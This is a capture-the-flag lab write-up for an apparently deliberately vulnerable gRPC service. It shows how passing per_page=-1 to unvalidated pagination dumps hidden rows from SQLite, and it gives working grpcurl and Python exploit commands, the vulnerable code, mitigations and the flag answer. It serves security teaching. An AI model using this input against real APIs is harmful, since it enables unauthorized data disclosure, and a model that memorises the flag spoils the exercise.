# Challenge 13 — Integer Overflow / Unvalidated Pagination

| Difficulty | Category          | Service        |
|:----------:|-------------------|----------------|
| 🟡  Medium | Injection / BAC   | ProductService |

**Flag:** `FLAG{int3g3r_b0unds_n0t_v4l1d4t3d}`

---

## Real-world motivation

"Just pass the page size from the client" is one of the most common API
anti-patterns.  Once the server trusts `int32 per_page` blindly, a whole
family of exploits becomes possible:

- **GitHub 2019** — a public endpoint accepted `per_page=100000`, letting
  a single HTTP call exfiltrate an entire organisation's repo list.
- **SQLite quirk** — `LIMIT -1` means *no limit*. Negative offsets are
  silently clamped to 0. If your LIMIT clause comes from the client,
  congratulations: you just shipped `SELECT *`.
- **CWE-190** — Integer Overflow/Wraparound.
- **OWASP API Security Top 10 — API4:2023** Unrestricted Resource
  Consumption.

---

## Objective

Retrieve the *hidden premium product* that the application never shows
through the normal `SearchProducts` endpoint.  The product's description
contains the flag.

---

## Reconnaissance

```bash
# Normal behaviour — default per_page = 5
grpcurl -plaintext -d '{"query":"","page":0,"per_page":5}' \
  localhost:50051 dvgrpc.ProductService/PaginatedSearch
```

You'll see the first 5 products; the premium item is missing.

---

## Exploit

```bash
grpcurl -plaintext -d '{"query":"","page":0,"per_page":-1}' \
  localhost:50051 dvgrpc.ProductService/PaginatedSearch
```

Python:

```python
from generated import product_pb2, product_pb2_grpc
import grpc

stub = product_pb2_grpc.ProductServiceStub(grpc.insecure_channel("localhost:50051"))
resp = stub.PaginatedSearch(product_pb2.PaginatedSearchRequest(
    query="", page=0, per_page=-1))

for p in resp.products:
    print(p.name, "—", p.description)
```

Automated: `python client/exploits/exploit_13_integer_overflow.py`

---

## Root cause

```python
per_page = request.per_page if request.per_page else 5
sql = "... LIMIT ? OFFSET ?"
cursor.execute(sql, (f"%{q}%", per_page, page * per_page))
```

- No check that `per_page >= 0` or has an upper bound.
- SQLite treats `LIMIT -1` as unlimited.
- No authorisation check that the caller should see all products.

---

## Mitigation

```python
MAX_PER_PAGE = 100
per_page = max(1, min(request.per_page or 20, MAX_PER_PAGE))
page     = max(0, request.page)
offset   = page * per_page
```

Additionally:

- Hide "draft" / "premium" rows behind a server-side authorisation rule,
  not behind obscurity.
- Prefer cursor-based pagination (opaque `next_page_token`) over numeric
  page/per_page for large tables.
- Return 400/INVALID_ARGUMENT on out-of-range values — don't silently
  clamp, don't silently dump.

---

## References

- [CWE-190 — Integer Overflow or Wraparound](https://cwe.mitre.org/data/definitions/190.html)
- [OWASP API4:2023 — Unrestricted Resource Consumption](https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/)
- SQLite docs — [LIMIT clause](https://www.sqlite.org/lang_select.html#limitoffset)
